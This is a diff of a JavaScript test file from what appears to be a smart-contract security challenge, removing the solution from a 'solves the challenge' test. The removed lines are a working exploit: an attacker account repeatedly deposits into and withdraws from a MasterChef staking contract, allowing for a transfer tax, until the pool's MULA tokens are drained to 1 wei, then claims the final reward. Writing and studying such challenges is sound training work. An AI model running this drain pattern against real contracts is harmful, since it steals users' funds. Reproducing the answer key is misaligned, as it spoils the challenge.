@@ -57,27 +57,6 @@ before(async () => {
 
 it("solves the challenge", async function () {
 
-  await mula.connect(attacker).approve(masterChef.address,ethers.constants.MaxUint256)
-
-  let attackerBalance = await mula.balanceOf(await attacker.getAddress())
-  let masterChefBalance
-
-  while (true) {
-    await masterChef.connect(attacker).deposit(0,attackerBalance)
-    masterChefBalance = (await mula.balanceOf(masterChef.address)).sub(1)
-
-    if (masterChefBalance.lt(attackerBalance)) {
-      await masterChef.connect(attacker).withdraw(0,masterChefBalance)
-      break // reached 1 wei in balance
-    } else {
-      await masterChef.connect(attacker).withdraw(0,attackerBalance)
-    }
-
-    attackerBalance = attackerBalance.mul(95).div(100) // post transfer tax
-  }
-
-  await masterChef.connect(attacker).deposit(0,1) // get final reward
-
 });
 
 /// expected final state
